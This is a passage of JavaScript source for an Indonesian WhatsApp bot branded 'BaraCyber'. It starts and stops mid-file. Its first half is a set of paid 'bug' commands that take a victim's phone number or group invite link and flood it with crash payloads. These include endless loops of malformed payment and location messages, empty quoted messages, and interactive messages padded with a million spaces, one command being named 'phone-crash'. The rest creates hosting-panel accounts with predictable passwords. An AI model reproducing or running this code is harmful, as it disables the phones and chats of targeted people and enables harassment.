
if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await BaraCybeer.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'onekil': case 'doublekil': case '💀': case 'triplekill': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 1; j++) {
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply('Sucessfull sent bug') 
}
break
case 'unlimited-bug': case '😈': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (;;) {
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, hdzbug)
await ngeloc(target, force)
await sleep(30000)
}
}
break
case 'limapuluh': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await BaraCybeer.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363321008297293@newsletter', newsletterName: `By BaraCyber`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await BaraCybeer.sendMessage(m.chat, { react: { text: '🐛', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
        case 'centang_satu': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await BaraCybeer.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
case 'phone-crash': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
  for (;;) {
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
  }
}
break
case 'bara-unlimited': case 'bara-ui': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
await reply(`In proses....`)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'bara-uicrash': case 'bara-infinity': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
reply(`In proses....`)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
case 'bug-button': case 'bug-sitexyz': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`In proses....`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await BaraCybeer.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #BaraCyber"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'BaraCyber', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: hdzbug })
await BaraCybeer.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${bijipler} \n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'button-internal': case 'button-external': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`In proses....`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await BaraCybeer.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #BaraCyber"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻BaraCyber⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: hdzbug })
await BaraCybeer.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${bijipler} \n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'enemygroup': case 'bug-hole': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`In proses....`)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #BaraCyber"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'BaraCyber', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: hdzbug })
await BaraCybeer.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${bijipler} \n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'internal-group': case 'external-group': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`In proses....`)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #BaraCyber"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'BaraCyber👿', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: hdzbug })
await BaraCybeer.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${bijipler} \n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
// BATAS

//============= CASE PANEL =============//
case '1gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return BaraCybeer(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "1024"
let email = username + "Bara@Cyber.io"
akunlo = "https://b.top4top.io/p_3189wqnd31.jpg" 
if (!u) return
let d = (await BaraCybeer.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
BaraCybeer.sendMessage(u, { image: { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return BaraCybeer(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '2gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return BaraCybeer(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2024"
let cpu = "70"
let disk = "2024"
let email = username + "Bara@Cyber.io"
akunlo = "https://b.top4top.io/p_3189wqnd31.jpg" 
if (!u) return
let d = (await BaraCybeer.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
BaraCybeer.sendMessage(u, { image: { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return BaraCybeer(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '3gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return BaraCybeer(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "Bara@Cyber.io"
akunlo = "https://b.top4top.io/p_3189wqnd31.jpg" 
if (!u) return
let d = (await BaraCybeer.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
BaraCybeer.sendMessage(u, { image: { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return BaraCybeer(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '4gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return BaraCybeer(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "4024"
let cpu = "80"
let disk = "4024"
let email = username + "Bara@Cyber.io"
akunlo = "https://b.top4top.io/p_3189wqnd31.jpg" 
if (!u) return
let d = (await BaraCybeer.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
BaraCybeer.sendMessage(u, { image: { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return BaraCybeer(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '5gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return BaraCybeer(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "5024"
let cpu = "100"
let disk = "5024"
let email = username + "Bara@Cyber.io"
akunlo = "https://b.top4top.io/p_3189wqnd31.jpg" 
if (!u) return
let d = (await BaraCybeer.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
BaraCybeer.sendMessage(u, { image: { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return BaraCybeer(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '6gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return BaraCybeer(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "6024"
let cpu = "160"
let disk = "6024"
let email = username + "Bara@Cyber.io"
akunlo = "https://b.top4top.io/p_3189wqnd31.jpg" 
if (!u) return
let d = (await BaraCybeer.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
BaraCybeer.sendMessage(u, { image: { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return BaraCybeer(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '7gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return BaraCybeer(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
